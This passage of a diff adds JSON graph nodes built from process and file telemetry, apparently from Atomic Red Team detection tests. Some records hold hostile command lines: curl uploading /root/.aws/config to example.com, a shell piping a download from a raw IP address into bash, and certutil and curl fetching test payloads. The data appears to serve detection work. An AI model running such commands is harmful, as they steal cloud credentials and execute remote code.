+        "id": "Process:{ec2d99e9-8852-61b3-785d-5260cd550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B3FF-605B-8069-00000000AE01}:1",
+      "label": "conhost.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{896A638B-B3FF-605B-8069-00000000AE01}",
+        "pid": "4236",
+        "image_path": "%system32%\\conhost.exe",
+        "command_line": "",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{896A638B-B3FF-605B-8069-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "conhost.exe",
+        "name": "conhost.exe"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B3F6-605B-7869-00000000AE01}:1",
+      "label": "certutil.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "certutil.exe",
+        "guid": "{896A638B-B3F6-605B-7869-00000000AE01}",
+        "pid": "4944",
+        "image_path": "%system32%\\certutil.exe",
+        "command_line": "%system32%\\certutil.exe\" \\verifyctl -split -f https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\license.txt",
+        "original_file_name": "certutil.exe",
+        "image_hash": "MD5=BF7CEA72AE186A10239F830F93492A73,SHA256=A50DFE408565C2BB011D013AC43E616B2A595B1D06EB9B083F519672732498DA,IMPHASH=442218E88D4D6AA0BE3165DD7B20A4C4",
+        "command_hash": "0ef70151bcd483fe96466a5b51e512818da6466750fbee6aa551b1dbab7a51bc",
+        "event_id": "1",
+        "id": "Process:{896A638B-B3F6-605B-7869-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "certutil.exe",
+        "name": "certutil.exe",
+        "parent_process_id": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
+      "label": "powershell.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{8B6011A9-C6FA-616E-9B35-01000000F101}",
+        "pid": "300",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe"
+      }
+    },
+    {
+      "id": "Process:{ec28c72e-d396-62e3-782d-b124e8550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec28c72e-d396-62e3-782d-b124e8550000}",
+        "pid": "22911",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -f userfile=@\\root\\.aws\\config http:\\example.com",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "3b6c8eb8c2f4a260ad25a3f26b74ad04d49182fb715c3a9eb147d61c4a9b0a10",
+        "parent_process_id": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+        "user_id": "user:\\ubuntu",
+        "event_id": "1",
+        "id": "Process:{ec28c72e-d396-62e3-782d-b124e8550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{8B6011A9-92C8-616D-4E11-01000000F101}",
+        "pid": "6812",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe"
+      }
+    },
+    {
+      "id": "network:<loopback_ip>:53:udp",
+      "label": "<LOOPBACK_IP>",
+      "type": "network",
+      "group": "Network",
+      "properties": {
+        "destination_ip": "<LOOPBACK_IP>",
+        "destination_port": "53",
+        "protocol": "udp",
+        "domain_name": "-",
+        "source_image_path": "usr\\bin\\wget",
+        "parent_process_id": "Process:{ec2d99e9-ed26-61ae-703c-e40c0c560000}:1",
+        "event_id": "3",
+        "id": "network:<loopback_ip>:53:udp",
+        "type": "Network",
+        "entity_class": "NetworkEntity",
+        "display_name": "<LOOPBACK_IP>",
+        "name": "<LOOPBACK_IP>"
+      }
+    },
+    {
+      "id": "File:1243375dbdd9510e3f2a74b8f10f7e82b5108f549e5537481acc53b7b22a1371:7",
+      "label": "advapi32.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\advapi32.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=A8CDCAC5C32D14ED8AADDF5489FC5D55,SHA256=140F07A8F6780DAFE20CC4FBE86C9332FB2F0C26ED8F49914BD05265C63EF6F1",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:1243375dbdd9510e3f2a74b8f10f7e82b5108f549e5537481acc53b7b22a1371:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "advapi32.dll",
+        "name": "advapi32.dll"
+      }
+    },
+    {
+      "id": "File:d000c4545f131a56947708a4d526e884a9bd6578c0ec2d735e4e4e23749c6df2:7",
+      "label": "rpcrt4.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\rpcrt4.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=B0C4BF9491FB453B77399E3C56C11DC8,SHA256=66D5D1B3D25D15EA8737C8B2EF83E770BA10931868F24DCACC50936F0A0BAC08",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:d000c4545f131a56947708a4d526e884a9bd6578c0ec2d735e4e4e23749c6df2:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "rpcrt4.dll",
+        "name": "rpcrt4.dll"
+      }
+    },
+    {
+      "id": "Process:{ec28c72e-0e2a-62e4-78ad-3268be550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec28c72e-0e2a-62e4-78ad-3268be550000}",
+        "pid": "23427",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -so https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1059.004\\src\\echo-art-fish.sh \\tmp\\echo-art-fish.sh",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "40c350ef2e20365be9f699d8b233bf5a3d58cf808c871f10030810db3c9f707a",
+        "parent_process_id": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+        "user_id": "user:\\root",
+        "event_id": "1",
+        "id": "Process:{ec28c72e-0e2a-62e4-78ad-3268be550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-C6FA-616E-9C35-01000000F101}:1",
+      "label": "conhost.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{8B6011A9-C6FA-616E-9C35-01000000F101}",
+        "pid": "4136",
+        "image_path": "%system32%\\conhost.exe",
+        "command_line": "",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{8B6011A9-C6FA-616E-9C35-01000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "conhost.exe",
+        "name": "conhost.exe"
+      }
+    },
+    {
+      "id": "Process:{ec28c72e-ee09-62e3-78dd-38347a550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec28c72e-ee09-62e3-78dd-38347a550000}",
+        "pid": "23108",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -so https:\\gist.githubusercontent.com\\mhaggis\\b7fe00e3f4b12de4dc302ad3b0a9b26f\\raw\\5f6b35cce55d038403bbc38272f45853ea42c390\\test.mofhttps:\\gist.githubusercontent.com\\mhaggis\\b7fe00e3f4b12de4dc302ad3b0a9b26f\\raw\\5f6b35cce55d038403bbc38272f45853ea42c390\\test.mof",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "17ee09773504ffb20f9bcf4f08bdbacc32983303ce08e40e6826c8dfd88cce2a",
+        "parent_process_id": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+        "user_id": "user:\\root",
+        "event_id": "1",
+        "id": "Process:{ec28c72e-ee09-62e3-78dd-38347a550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "File:7231190315d39551649f4f9da449a9e30e1a887595cd95a5847553e5927c9596:7",
+      "label": "rsaenh.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\rsaenh.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=28140830C342F475A597B2D54C42DFFA,SHA256=99E23D0177C6DC59AD72DEEC46CFB995828EF567F001261BC65532B6DDEAD862",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:7231190315d39551649f4f9da449a9e30e1a887595cd95a5847553e5927c9596:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "rsaenh.dll",
+        "name": "rsaenh.dll"
+      }
+    },
+    {
+      "id": "File:428506138d0bf77848c28449fcb8ba88ffe60393e5bbee010b60571c30004e86:7",
+      "label": "nsi.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\nsi.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=994E2A6D2A0B38E0968B3998E42033AC,SHA256=491F2D1DE09C39B324BCF5800198AC7CCE755F4023F1FEB3854D33716461BC27",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:428506138d0bf77848c28449fcb8ba88ffe60393e5bbee010b60571c30004e86:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "nsi.dll",
+        "name": "nsi.dll"
+      }
+    },
+    {
+      "id": "Process:{ec28c72e-0f16-62e4-78bd-82e05d550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec28c72e-0f16-62e4-78bd-82e05d550000}",
+        "pid": "23501",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -so https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1059.004\\src\\echo-art-fish.sh \\tmp\\echoartfish.sh",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "f52df2b464c0ceffc27358b01ee17b23731278079740ceff50693242d175787d",
+        "parent_process_id": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+        "user_id": "user:\\root",
+        "event_id": "1",
+        "id": "Process:{ec28c72e-0f16-62e4-78bd-82e05d550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "File:68b3c8f8ab782e0642adc09bae2bacadb161b2fba9ead93f7569fc8ff03f0676:7",
+      "label": "sechost.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\sechost.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=E6B98644CD3B912C44C39CC0996790A9,SHA256=23BE56E1B8DBA449C0959753175BD15457EC88E93E9E8B86489266347959A6F2",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:68b3c8f8ab782e0642adc09bae2bacadb161b2fba9ead93f7569fc8ff03f0676:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "sechost.dll",
+        "name": "sechost.dll"
+      }
+    },
+    {
+      "id": "Process:{ec2d99e9-ce9c-61b3-ecee-10bc91550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec2d99e9-ce9c-61b3-ecee-10bc91550000}",
+        "pid": "11451",
+        "image_path": "bin\\busybox",
+        "command_line": "bin\\sh -c (curl -s 45.155.205.233:5874\\96.126.96.16:8080||wget -q -o- 45.155.205.233:5874\\96.126.96.16:8080)|bash",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "7028c76c89aa22e3c5326e48a64edc22aad0f2d2824feb1e14c8cb93345af1de",
+        "parent_process_id": "Process:{00000000-0000-0000-0000-000000000000}:1",
+        "user_id": "user:\\root",
+        "event_id": "1",
+        "id": "Process:{ec2d99e9-ce9c-61b3-ecee-10bc91550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B42B-605B-8D69-00000000AE01}:1",
+      "label": "certutil.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "certutil.exe",
+        "guid": "{896A638B-B42B-605B-8D69-00000000AE01}",
+        "pid": "5360",
+        "image_path": "%system32%\\certutil.exe",
+        "command_line": "%system32%\\certutil.exe\" ―urlcache -split -f https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\license.txt c:\\temp\\foo.txt",
+        "original_file_name": "certutil.exe",
+        "image_hash": "MD5=BF7CEA72AE186A10239F830F93492A73,SHA256=A50DFE408565C2BB011D013AC43E616B2A595B1D06EB9B083F519672732498DA,IMPHASH=442218E88D4D6AA0BE3165DD7B20A4C4",
+        "command_hash": "d0338c1b343b4ff0b516929181b81335e0aafb6795f3e6eaf89bf875ef4ed511",
+        "parent_process_id": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{896A638B-B42B-605B-8D69-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "certutil.exe",
+        "name": "certutil.exe"
+      }
+    },
+    {
+      "id": "Process:{ec28c72e-0e19-62e4-782d-c19dfa550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec28c72e-0e19-62e4-782d-c19dfa550000}",
+        "pid": "23423",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -so https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1059.004\\src\\echo-art-fish.sh \\tmp",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "cbaf0ac82739bcd182e8438a80ebcdd00cce297431bb295e178f04ae8c3cc699",
+        "parent_process_id": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+        "user_id": "user:\\root",
+        "event_id": "1",
+        "id": "Process:{ec28c72e-0e19-62e4-782d-c19dfa550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "File:0165b9905b4a34eb987f8aeb6126ed5a2f9d28d6bde7549223e7de947e645a75:7",
+      "label": "ws2_32.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\ws2_32.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=06E82905620845A7C185BDEE85CC4140,SHA256=B75C9B080293F85568912BABE749F403144959206F9C6BAB36B628E8F77C5DA0",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:0165b9905b4a34eb987f8aeb6126ed5a2f9d28d6bde7549223e7de947e645a75:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "ws2_32.dll",
+        "name": "ws2_32.dll"
+      }
+    },
+    {
+      "id": "File:e6beef42f39141f35cc0aaed3becfbe793c4d8f0010f55f892372773cbd29923:11",
+      "label": "allthethingsx64.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%temp%\\2\\allthethingsx64.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "11",
+        "id": "File:e6beef42f39141f35cc0aaed3becfbe793c4d8f0010f55f892372773cbd29923:11",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "allthethingsx64.dll",
+        "name": "allthethingsx64.dll"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-F329-616E-043B-01000000F101}:1",
+      "label": "windows command processor",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{8B6011A9-F329-616E-043B-01000000F101}",
+        "pid": "2936",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"%windir%\\system32\\curl.exe -k https:\\github.com\\redcanaryco\\atomic-red-team\\raw\\058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e\\atomics\\t1218.010\\bin\\allthethingsx64.dll -o %userprofile%\\music\\allthethingsx64.dll & c:\\windows\\system32\\curl.exe -k https:\\github.com\\redcanaryco\\atomic-red-team\\raw\\058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e\\atomics\\t1218.010\\bin\\allthethingsx64.dll --output %public%\\music\\allthethingsx64.dll & c:\\windows\\system32\\curl.exe -k https:\\github.com\\redcanaryco\\atomic-red-team\\raw\\058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e\\atomics\\t1218.010\\bin\\allthethingsx64.dll -o %programdata%\\allthethingsx64.dll & c:\\windows\\system32\\curl.exe -k https:\\github.com\\redcanaryco\\atomic-red-team\\raw\\058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e\\atomics\\t1218.010\\bin\\allthethingsx64.dll -o %%temp%%\\allthethingsx64.dll",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2",
+        "command_hash": "9aba71698a69dc5c6df0000be1698f828dd13f4465ad72037499856c4daef11d",
+        "parent_process_id": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-F329-616E-043B-01000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows command processor",
+        "name": "windows command processor"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-E59F-618B-AFA5-04000000F101}:1",
+      "label": "the curl executable",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "the curl executable",
+        "guid": "{8B6011A9-E59F-618B-AFA5-04000000F101}",
+        "pid": "3300",
+        "image_path": "%system32%\\curl.exe",
+        "command_line": "curl.exe  -f c:\\temp\\atomictestfile.txt www.example.com",
+        "original_file_name": "curl.exe",
+        "image_hash": "MD5=46A8FE9CE08112D542220E850323D334,SHA256=7F43DE7FB365D85CF8FEE0EC66D43B09FB3D559B02A432E5925E3748BC3BD528",
+        "command_hash": "98e966ea0871e892b6e2d09fed90c98e51bcb0ef68d814e60fadcdcfe06748d5",
+        "parent_process_id": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-E59F-618B-AFA5-04000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "the curl executable",
+        "name": "the curl executable"
+      }
+    },
+    {
+      "id": "Process:{ec28c72e-d389-62e3-788d-737768550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec28c72e-d389-62e3-788d-737768550000}",
+        "pid": "22909",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -f curl -f “userfile=@\\root\\.aws\\config” hxxp:\\example.com",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "0da4110ef907f8aea465e8bef360ddb09802e40a13325bfd770195b2a963f7a3",
+        "parent_process_id": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+        "user_id": "user:\\ubuntu",
+        "event_id": "1",
+        "id": "Process:{ec28c72e-d389-62e3-788d-737768550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "File:6e23e41705c933904a855fb517b24075468eb5d22501ebc71d4ecbdedbdbd19a:7",
+      "label": "curl.exe",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\curl.exe",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=46A8FE9CE08112D542220E850323D334,SHA256=7F43DE7FB365D85CF8FEE0EC66D43B09FB3D559B02A432E5925E3748BC3BD528",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:6e23e41705c933904a855fb517b24075468eb5d22501ebc71d4ecbdedbdbd19a:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "curl.exe",
+        "name": "curl.exe"
+      }
+    },
+    {
+      "id": "Process:{ec28c72e-d38a-62e3-78ad-379917560000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec28c72e-d38a-62e3-78ad-379917560000}",
+        "pid": "22910",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -f “userfile=@\\root\\.aws\\config” hxxp:\\example.com",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "b189ab9b7d28d476f4f13a955d5e28307105dc74f69c1cb014ce32de53ac2a1f",
+        "parent_process_id": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+        "user_id": "user:\\ubuntu",
+        "event_id": "1",
+        "id": "Process:{ec28c72e-d38a-62e3-78ad-379917560000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{38b9f94a-6af3-6754-0b74-000000002f03}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{38b9f94a-6af3-6754-0b74-000000002f03}",
+        "pid": "6216",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{38b9f94a-6af3-6754-0b74-000000002f03}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe"
+      }
+    },
+    {
+      "id": "File:06f632cae2bed7616797c0603a9502bf7f67eb41b717e221d150252f09a0178a:7",
+      "label": "kernel32.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\kernel32.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=A5AD62615D2361BFAEC6C047B199184C,SHA256=B43F3DFDAF7BAA7A2B97015631F96CE429C50348D380080CFC29C36F959D7886",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:06f632cae2bed7616797c0603a9502bf7f67eb41b717e221d150252f09a0178a:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "kernel32.dll",
+        "name": "kernel32.dll"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B3FF-605B-7F69-00000000AE01}:10",
+      "label": "certutil.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "certutil.exe",
+        "guid": "{896A638B-B3FF-605B-7F69-00000000AE01}",
+        "pid": "3440",
+        "image_path": "%system32%\\certutil.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1fffff for certutil.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "240089475c4c4530706a0009743df43857a8b08e7cd95d30429778dffb61ce67",
+        "parent_process_id": "Process:{896A638B-B3FF-605B-8069-00000000AE01}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{896A638B-B3FF-605B-7F69-00000000AE01}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "certutil.exe",
+        "name": "certutil.exe"
+      }
+    },
+    {
+      "id": "File:a9f673787ab340d6ef4d056f268e369ad01971bdadee80a29ef5c155e82e3ff8:7",
+      "label": "mswsock.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\mswsock.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=B52ACA309FD6F72105951FFBA022327B,SHA256=02AB6CCE4BF0D3F075D5E982F5A4CBDB514CE7C245EA474D7846A86CD3F13202",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:a9f673787ab340d6ef4d056f268e369ad01971bdadee80a29ef5c155e82e3ff8:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "mswsock.dll",
+        "name": "mswsock.dll"
+      }
+    },
+    {
+      "id": "File:c5943c7cede5876ed03f38261c4ec12c11a4f669afdb57b85314c1b5a48f8cd6:7",
+      "label": "bcrypt.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\bcrypt.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=63231EA984BC614584102A96D4F35CB4,SHA256=13C5BD283C01B0D50D8D0D99E88FC67F9234FA14A6860AB2B6EE552199FF6A74",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:c5943c7cede5876ed03f38261c4ec12c11a4f669afdb57b85314c1b5a48f8cd6:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "bcrypt.dll",
+        "name": "bcrypt.dll"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:10",
+      "label": "curl.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "curl.exe",
+        "guid": "{8B6011A9-F32A-616E-083B-01000000F101}",
+        "pid": "2544",
+        "image_path": "%system32%\\curl.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1fffff for curl.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "a2b39fbbaced64cecf4e2e6a643c43d4220a2f87a7dbd546e7e276aff82fe969",
+        "parent_process_id": "Process:{8B6011A9-C6FA-616E-9C35-01000000F101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "curl.exe",
+        "name": "curl.exe"
+      }
+    },
+    {
+      "id": "File:160eab8f24686d769c9bfa8cadb5e632c358366e7ec2eaf3373a2ef4d731629e:7",
+      "label": "cryptsp.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\cryptsp.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=9500AE4C4B639FEAEED0CC6C39F45149,SHA256=C1055D4B9A854282336A5404CA0FCB1A2EBC3417600035338C9CDFC7B8D0778C",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:160eab8f24686d769c9bfa8cadb5e632c358366e7ec2eaf3373a2ef4d731629e:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "cryptsp.dll",
+        "name": "cryptsp.dll"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-E4FA-618B-97A5-04000000F101}:1",
+      "label": "the curl executable",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "the curl executable",
+        "guid": "{8B6011A9-E4FA-618B-97A5-04000000F101}",
+        "pid": "216",
+        "image_path": "%system32%\\curl.exe",
+        "command_line": "curl.exe  -d c:\\temp\\atomictestfile.txt www.example.com",
+        "original_file_name": "curl.exe",
+        "image_hash": "MD5=46A8FE9CE08112D542220E850323D334,SHA256=7F43DE7FB365D85CF8FEE0EC66D43B09FB3D559B02A432E5925E3748BC3BD528",
+        "command_hash": "e088c36d3bc46a95fce3f6ca7ecf539d8868e57040a5c7f7aa4b9f51f152f0f7",
+        "parent_process_id": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-E4FA-618B-97A5-04000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "the curl executable",
